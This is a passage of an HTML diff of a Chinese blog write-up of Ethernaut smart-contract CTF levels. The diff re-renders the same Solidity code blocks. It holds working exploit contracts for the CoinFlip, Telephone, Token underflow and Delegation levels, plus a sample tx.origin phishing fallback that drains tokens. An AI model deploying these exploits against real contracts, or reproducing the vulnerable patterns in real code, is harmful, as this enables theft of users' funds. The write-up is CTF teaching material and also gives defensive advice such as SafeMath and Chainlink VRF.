class="line">contract exploit &#123;</span><br><span class="line">  CoinFlip expFlip;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">  function exploit(address aimAddr) &#123;</span><br><span class="line">    expFlip = CoinFlip(aimAddr);</span><br><span class="line">  &#125;</span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool guess = coinFlip == 1 ? true : false;</span><br><span class="line">    expFlip.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span>
+<span class="token keyword">contract</span> <span class="token class-name">CoinFlip</span> <span class="token punctuation">&#123;</span>
+  <span class="token builtin">uint256</span> <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>
+  <span class="token builtin">uint256</span> lastHash<span class="token punctuation">;</span>
+  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>
+  <span class="token keyword">function</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token builtin">bool</span> _guess<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>
+    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> blockValue<span class="token operator">/</span>FACTOR<span class="token punctuation">;</span>
+    <span class="token builtin">bool</span> side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">exploit</span> <span class="token punctuation">&#123;</span>
+  CoinFlip expFlip<span class="token punctuation">;</span>
+  <span class="token builtin">uint256</span> FACTOR <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>
+  <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token builtin">address</span> aimAddr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    expFlip <span class="token operator">=</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span>aimAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    <span class="token builtin">uint256</span> blockValue <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token builtin">uint256</span> coinFlip <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">(</span>blockValue<span class="token punctuation">)</span> <span class="token operator">/</span> FACTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token builtin">bool</span> guess <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    expFlip<span class="token punctuation">.</span><span class="token function">flip</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>在Remix IDE中通过Metamask部署到题目的区块链上，进行10次hack攻击即可</p>
 <blockquote>
@@ -464,13 +529,47 @@
 <p>想要获得密码学上的随机数,你可以使用 <a target="_blank" rel="noopener" href="https://docs.chain.link/docs/get-a-random-number">Chainlink VRF</a>, 它使用预言机, LINK token, 和一个链上合约来检验这是不是真的是一个随机数.</p>
 <p>一些其它的选项包括使用比特币block headers (通过验证 <a target="_blank" rel="noopener" href="http://btcrelay.org/">BTC Relay</a>), <a target="_blank" rel="noopener" href="https://github.com/randao/randao">RANDAO</a>, 或是 <a target="_blank" rel="noopener" href="http://www.oraclize.it/">Oraclize</a>).</p>
 </blockquote>
-<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract Telephone &#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+<span class="token keyword">contract</span> <span class="token class-name">Telephone</span> <span class="token punctuation">&#123;</span>
+  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>直接看<code>tx.origin</code>和<code>msg.sender</code>的区别</p>
 <p><strong>msg.sender:</strong> 指直接调用智能合约功能的帐户或智能合约的地址<br><strong>tx.origin:</strong> 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin</p>
 <p><img src="https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg"></p>
 <p>我们开一个新合约直接传入我们自己的address通过新合约调用Telephone合约即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.4.16;</span><br><span class="line">contract Telephone &#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract hh&#123;</span><br><span class="line">    address ow=0xeeD53DF0B7E5CF4272a2E92c4E39B1405910d8C7;</span><br><span class="line">    Telephone exp;</span><br><span class="line">    constructor(address name)&#123;</span><br><span class="line">        exp=Telephone(name);</span><br><span class="line">    &#125;</span><br><span class="line">    function hack()&#123;</span><br><span class="line">        exp.changeOwner(ow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span>
+<span class="token keyword">contract</span> <span class="token class-name">Telephone</span> <span class="token punctuation">&#123;</span>
+  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">function</span> <span class="token function">changeOwner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">contract</span> <span class="token class-name">hh</span><span class="token punctuation">&#123;</span>
+    <span class="token builtin">address</span> ow<span class="token operator">=</span><span class="token number">0xeeD53DF0B7E5CF4272a2E92c4E39B1405910d8C7</span><span class="token punctuation">;</span>
+    Telephone exp<span class="token punctuation">;</span>
+    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        exp<span class="token operator">=</span><span class="token function">Telephone</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        exp<span class="token punctuation">.</span><span class="token function">changeOwner</span><span class="token punctuation">(</span>ow<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p>这个例子比较简单, 混淆 <code>tx.origin</code> 和 <code>msg.sender</code> 会导致 phishing-style 攻击, 比如<a target="_blank" rel="noopener" href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/">this</a>.</p>
@@ -478,12 +577,17 @@
 <ol>
 <li>使用 <code>tx.origin</code> 来决定转移谁的token, 比如.</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint _value) &#123;</span><br><span class="line">  tokens[tx.origin] -= _value;</span><br><span class="line">  tokens[_to] += _value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">function transfer(address _to, uint _value) &#123;
+  tokens[tx.origin] -&#x3D; _value;
+  tokens[_to] +&#x3D; _value;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ol start="2">
 <li>攻击者通过调用合约的 transfer 函数是受害者向恶意合约转移资产, 比如</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function () payable &#123;</span><br><span class="line">  token.transfer(attackerAddress, 10000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">function () payable &#123;
+  token.transfer(attackerAddress, 10000);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <ol start="3">
 <li>在这个情况下, <code>tx.origin</code> 是受害者的地址 ( <code>msg.sender</code> 是恶意协议的地址), 这会导致受害者的资产被转移到攻击者的手上.</li>
@@ -497,17 +601,41 @@
 <li>什么是 odometer?</li>
 </ul>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token punctuation">&#123;</span>
+
+  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> balances<span class="token punctuation">;</span>
+  <span class="token builtin">uint</span> <span class="token keyword">public</span> totalSupply<span class="token punctuation">;</span>
+
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _initialSupply<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> totalSupply <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _value <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>
+    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">+=</span> _value<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_owner<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>看代码，balances映射的相当是我们的token个数，初始为20个，再看transfer函数，要求我们的token数减去交易数要大于等于0，但是问题是token数和交易数都是uint类型，恒大于等于0（因为运算结果也是uint类型），所以require根本不需要绕过，如果我们将<code>_value</code>值设定为21，就会出现溢出，导致我们的balance极大，也就完成了任务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.transfer(instance,21)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">contract.transfer(instance,21)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
 <p>Overflow 在 solidity 中非常常见, 你必须小心检查, 比如下面这样:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(a + c &gt; a) &#123;</span><br><span class="line">  a = a + c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">if(a + c &gt; a) &#123;
+  a &#x3D; a + c;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>另一个简单的方法是使用 OpenZeppelin 的 SafeMath 库, 它会自动检查所有数学运算的溢出, 可以像这样使用:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = a.add(c);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">a &#x3D; a.add(c);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>如果有溢出, 代码会自动恢复.</p>
 </blockquote>
@@ -520,23 +648,55 @@
 <li>方法 ID</li>
 </ul>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Delegate</span> <span class="token punctuation">&#123;</span>
+
+  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
+
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">Delegation</span> <span class="token punctuation">&#123;</span>
+
+  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
+  Delegate delegate<span class="token punctuation">;</span>
+
+  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _delegateAddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>
+    delegate <span class="token operator">=</span> <span class="token function">Delegate</span><span class="token punctuation">(</span>_delegateAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>delegate<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">this</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>很明显需要通过调用pwn函数来将owner变成我们自己，但是部署的合约是<code>Delegation</code>，我们该如何调用另一个合约中的函数呢，很简单，使用solidity中自带的call方法即可</p>
 <p>在solidity中有三种call方法可用：</p>
 <ul>
 <li><p><strong>call</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用给定的payload发出一个低级(low-level)的<code>CALL</code>命令，返回执行是否成功和数据，转发所有可用gas，可调整。</p>
 </li>
 <li><p><strong>delegatecall</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address&gt;.delegatecall(bytes memory) returns (bool, bytes memory)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.delegatecall(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用给定payload发出一个低级的<code>DELEGATECALL</code>指令，返回执行是否成功和数据，转发所有可用gas，可调整。</p>
 </li>
 <li><p><strong>staticcall</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address&gt;.staticcall(bytes memory) returns (bool, bytes memory)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.staticcall(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用给定payload发出一个低级的<code>STATICCALL</code>指令，返回执行是否成功和数据，转发所有可用gas，可调整。</p>
 </li>
@@ -544,14 +704,39 @@
 </li>
 </ul>
 <p>乍一看似乎内容都差不多，那我们自己调用这些命令来测试一下吧</p>
